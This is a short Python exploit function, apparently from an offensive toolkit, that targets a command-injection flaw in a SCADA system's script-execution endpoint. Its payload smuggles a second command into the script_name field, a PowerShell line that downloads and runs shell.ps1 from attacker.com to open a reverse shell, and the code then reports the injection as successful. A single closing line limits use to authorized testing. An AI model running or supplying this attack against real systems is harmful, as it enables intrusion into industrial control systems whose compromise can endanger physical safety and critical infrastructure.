def scada_command_injection(scada_url):
    """
    Exploit command injection in SCADA script interface
    Many SCADA systems allow operators to run scripts
    """
    import requests

    # Vulnerable script execution endpoint
    url = f"{scada_url}/scripts/execute"

    # Inject OS command
    # Normal script: script.vbs
    # Injection: script.vbs & calc.exe

    payload = {
        "script_name": "maintenance.vbs & powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
    }

    response = requests.post(url, data=payload)

    if response.status_code == 200:
        print("[+] Command injection successful")
        print("[*] Reverse shell should connect")

# WARNING: Use only in authorized testing
